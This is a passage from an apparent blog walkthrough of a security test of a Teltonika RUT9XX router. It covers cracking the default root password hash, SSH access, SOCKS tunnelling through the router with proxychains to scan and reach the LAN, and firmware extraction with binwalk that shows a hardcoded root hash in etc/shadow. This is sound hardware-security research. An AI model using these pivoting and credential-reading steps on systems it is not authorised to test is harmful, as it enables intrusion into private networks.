$1$o1tYRea4$blIAJ7l1GqkT8NTwcC41n1:admin01The root password is “admin01”. It’s the default one because we didn’t change it in the web interfaceNow let’s try ssh to device┌──(kali㉿kali)-[~]└─$ ssh root@192.168.1.1 Unable to negotiate with 192.168.1.1 port 22: no matching host key type found. Their offer: ssh-rsaA problem with the host key. Let’s use ssh-rsassh -o HostKeyAlgorithms=ssh-rsa root@192.168.1.1 We can use shell access to explore system files and services.Pivoting to Lan networkWe can use our ssh acces to create a tunnel and explore the lan network for real case scenario.SSH TunnelingI’m going to create a tunnel with the machine and configure proxychains to use it.ssh -o HostKeyAlgorithms=ssh-rsa root@192.168.1.1 -D 9050 -N -f**-D** [bindaddress:]port Specifies a local &#39;&#39;dynamic&#39;&#39; application-level port forwarding. This works by allocating a socket to listen to _port_ on the local side, optionally bound to the specified _bind_address_. Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and **ssh** will act as a SOCKS server. Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.Now we need to add the socks proxy to proxychains/etc/proxychains4.confIn proxy lists at the end add :socks5 127.0.0.1 9050Now let’s test the tunnel with a curl to the router web page.┌──(kali㉿kali)-[~]└─$ proxychains curl http://localhost[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.16[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:80 ... OK&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.1//EN&quot; &quot;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&quot;&amp;gt;&amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; URL=/cgi-bin/luci&quot; /&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body style=&quot;background-color: white&quot;&amp;gt;&amp;lt;a style=&quot;color: white; text-decoration: none&quot; href=&quot;/cgi-bin/luci&quot;&amp;gt;Wait for configuration&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Using nmap┌──(kali㉿kali)-[~]└─$ proxychains nmap -sC -sV -p22 localhost[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.16Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 21:19 EDT[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:80 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OK[proxychains] Strict chain ... 127.0.0.1:9050 ... 127.0.0.1:22 ... OKNmap scan report for localhost (127.0.0.1)Host is up (0.0034s latency).PORT STATE SERVICE VERSION22/tcp open ssh Dropbear sshd 2018.76 (protocol 2.0)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can use the router to send anything to the local network. For example let’s hit our webserverproxychains curl http://192.168.1.110:8000┌──(kali㉿kali)-[~]└─$ python3 -m uploadserverFile upload available at /uploadServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...192.168.1.1 - - [24/Jul/2022 21:20:46] &quot;GET / HTTP/1.1&quot; 200 -As we can see 192.168.1.1 who did the resquest.We can attack LAN network directly now, especially targets that can be accessed only locally.CLI interfaceWe can test a CLI feature using a ssh tunnel from outside. It’s called “shellinabox”. We can run it form web interface / services / CLI.If we look at ps from the ssh shell, we can see that a new service has been executed and it uses port 4200. 2838 nobody 1536 S /usr/sbin/shellinaboxd --port=4200 2842 nobody 1496 S /usr/sbin/shellinaboxd --port=4200Let’s use our tunnel to access the serviceproxychains firefox Firmware analysis at end x)I’ll use binwalk to get more details about the firmware and extract files┌──(kali㉿kali)-[~]└─$ binwalk RUT9XX_R_00.04.172_WEBUI.binDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------512 0x200 LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3626612 bytes1192244 0x123134 Squashfs filesystem, little endian, version 4.0, compression:xz, size: 10170504 bytes, 2700 inodes, blocksize: 262144 bytes, created: 2018-04-10 12:23:58We can see that our system use Squashfs filesystem. Let’s extract the filesystembinwalk -e RUT9XX_R_00.04.172_WEBUI.bin┌──(kali㉿kali)-[~/_RUT9XX_R_00.04.172_WEBUI.bin.extracted/squashfs-root]└─$ ls -latotal 64drwxr-xr-x 16 kali kali 4096 Jul 24 22:02 .drwxr-xr-x 4 kali kali 4096 Jul 24 22:02 ..drwxr-xr-x 2 kali kali 4096 Apr 10 2018 bindrwxr-xr-x 2 kali kali 4096 Apr 10 2018 devdrwxr-xr-x 33 kali kali 4096 Jul 24 22:02 etcdrwxr-xr-x 13 kali kali 4096 Apr 10 2018 liblrwxrwxrwx 1 kali kali 9 Jul 24 22:02 log -&amp;gt; /dev/nulldrwxr-xr-x 3 kali kali 4096 Apr 10 2018 mntdrwxr-xr-x 2 kali kali 4096 Apr 10 2018 overlaydrwxr-xr-x 2 kali kali 4096 Apr 10 2018 procdrwxr-xr-x 2 kali kali 4096 Apr 10 2018 romdrwxr-xr-x 2 kali kali 4096 Apr 10 2018 rootdrwxr-xr-x 3 kali kali 4096 Apr 10 2018 sbindrwxr-xr-x 2 kali kali 4096 Apr 10 2018 sysdrwxrwxrwt 2 kali kali 4096 Apr 10 2018 tmpdrwxr-xr-x 8 kali kali 4096 Apr 10 2018 usrlrwxrwxrwx 1 kali kali 9 Jul 24 22:02 var -&amp;gt; /dev/nulldrwxr-xr-x 4 kali kali 4096 Apr 10 2018 wwwAs we see, this is the Linux filesystem. Let’s start by a quick check of the etc files.┌──(kali㉿kali)-[~/_RUT9XX_R_00.04.172_WEBUI.bin.extracted/squashfs-root]└─$ cat etc/shadow root:$1$o1tYRea4$blIAJ7l1GqkT8NTwcC41n1:15225:0:99999:7:::daemon:*:0:0:99999:7:::ftp:*:0:0:99999:7:::network:*:0:0:99999:7:::nobody:*:0:0:99999:7:::For the shadow file we can see the same hash that we cracked early, It’s the same one because we did’nt change it.If we start our study using firmware, we can see a security issue here with a hardcoded root password.For more static research, i’ll use a tool called firmwalker https://github.com/craigz28/firmwalker┌──(kali㉿kali)-[~/_RUT9XX_R_00.04.172_WEBUI.bin.extracted/squashfs-root]└─$ ./firmwalker.sh /home/kali/_RUT9XX_R_00.04.172_WEBUI.bin.extracted/squashfs-root output.txtThe tool used shodan so you need to init the api key (you can use the free one) or comment shodan commandes inside sh files.The output gives a quick look at interesting files like config and sh files.For more advanced tools, you can check FACT https://fkie-cad.github.io/FACT_core/ConclusionThere so much stuff to talk about it, analyze and maybe start digging for new CVEs with the recent firmware version but for today, this is all i got for you guys.I hope you find this article useful (i know it’s boring xd )." } ]
